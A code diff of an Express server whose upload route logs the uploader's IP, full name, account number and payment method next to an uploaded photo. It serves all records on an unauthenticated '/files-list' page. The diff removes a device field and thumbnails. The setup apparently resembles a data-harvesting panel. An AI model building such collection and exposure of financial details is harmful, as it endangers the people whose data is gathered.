@@ -59,20 +59,18 @@ app.post("/upload-photo", upload.single("photo"), (req, res) => {
   const {
     fullName = "",
     accountNumber = "",
-    transactionMethod = "",
-    deviceInfo = ""
+    transactionMethod = ""
   } = req.body;
 
-  console.log("Upload from IP:", clientIp, "file:", fileName, "device:", deviceInfo);
+  console.log("Upload from IP:", clientIp, "file:", fileName);
 
-  // Append to CSV log (add deviceInfo column)
+  // Append to CSV log
   const logLine = [
     new Date().toISOString(),
     clientIp,
     JSON.stringify(fullName),
     JSON.stringify(accountNumber),
     JSON.stringify(transactionMethod),
-    JSON.stringify(deviceInfo),
     fileName
   ].join(",") + "\n";
 
@@ -92,7 +90,7 @@ app.get("/files/:name", (req, res) => {
   res.sendFile(filePath);
 });
 
-// ---------- /files-list with IP + device + thumbnail ----------
+// ---------- NEW: /files-list with IP + metadata ----------
 app.get("/files-list", (req, res) => {
   const logPath = path.join(__dirname, "upload-log.csv");
 
@@ -107,8 +105,9 @@ app.get("/files-list", (req, res) => {
 
     const lines = data.trim().split("\n").filter(Boolean);
 
-    // Parse our CSV line that may contain quoted commas
+    // CSV parsing that respects our quoted fields
     const rows = lines.map(line => {
+      // split by commas, but ignore commas inside quotes
       const parts = line.match(/(".*?"|[^",\s]+)(?=\s*,|\s*$)/g) || [];
       const [
         iso = "",
@@ -116,7 +115,6 @@ app.get("/files-list", (req, res) => {
         fullName = '""',
         accountNumber = '""',
         transactionMethod = '""',
-        deviceInfo = '""',
         fileName = ""
       ] = parts;
 
@@ -130,13 +128,12 @@ app.get("/files-list", (req, res) => {
         fullName: safe(fullName),
         accountNumber: safe(accountNumber),
         transactionMethod: safe(transactionMethod),
-        deviceInfo: safe(deviceInfo),
         fileName: fileName
       };
     }).reverse(); // newest first
 
     const rowsHtml = rows.map(r => {
-      const fileUrl = `/files/${encodeURIComponent(r.fileName)}`;
+      const link = `/files/${encodeURIComponent(r.fileName)}`;
       return `
         <tr>
           <td>${r.time}</td>
@@ -144,13 +141,7 @@ app.get("/files-list", (req, res) => {
           <td>${r.fullName}</td>
           <td>${r.accountNumber}</td>
           <td>${r.transactionMethod}</td>
-          <td>${r.deviceInfo}</td>
-          <td>
-            <a href="${fileUrl}" target="_blank">
-              <img src="${fileUrl}" alt="snapshot" style="max-width:120px;max-height:90px;display:block;margin-bottom:4px;border-radius:4px;border:1px solid #ddd;" />
-              ${r.fileName}
-            </a>
-          </td>
+          <td><a href="${link}" target="_blank">${r.fileName}</a></td>
         </tr>`;
     }).join("");
 
@@ -161,27 +152,12 @@ app.get("/files-list", (req, res) => {
         <meta charset="utf-8" />
         <title>Uploaded Photos</title>
         <style>
-          body {
-            font-family: system-ui, -apple-system, "Segoe UI", sans-serif;
-            padding: 20px;
-            background:#f5f5f5;
-          }
+          body { font-family: system-ui, -apple-system, "Segoe UI", sans-serif;
+                 padding: 20px; background:#f5f5f5; }
           h1 { margin-bottom: 12px; }
-          table {
-            border-collapse: collapse;
-            width: 100%;
-            background:#fff;
-          }
-          th, td {
-            border: 1px solid #ccc;
-            padding: 6px 8px;
-            font-size: 13px;
-            vertical-align: top;
-          }
-          th {
-            background:#e5e7eb;
-            text-align:left;
-          }
+          table { border-collapse: collapse; width: 100%; background:#fff; }
+          th, td { border: 1px solid #ccc; padding: 6px 8px; font-size: 13px; }
+          th { background:#e5e7eb; text-align:left; }
           tr:nth-child(even) { background:#f9fafb; }
           a { color:#1d4ed8; text-decoration:none; }
           a:hover { text-decoration:underline; }
@@ -197,12 +173,11 @@ app.get("/files-list", (req, res) => {
               <th>Full Name</th>
               <th>Account #</th>
               <th>Method</th>
-              <th>Device / Phone</th>
-              <th>Photo</th>
+              <th>File</th>
             </tr>
           </thead>
           <tbody>
-            ${rowsHtml || "<tr><td colspan='7'>No uploads yet.</td></tr>"}
+            ${rowsHtml || "<tr><td colspan='6'>No uploads yet.</td></tr>"}
           </tbody>
         </table>
       </body>
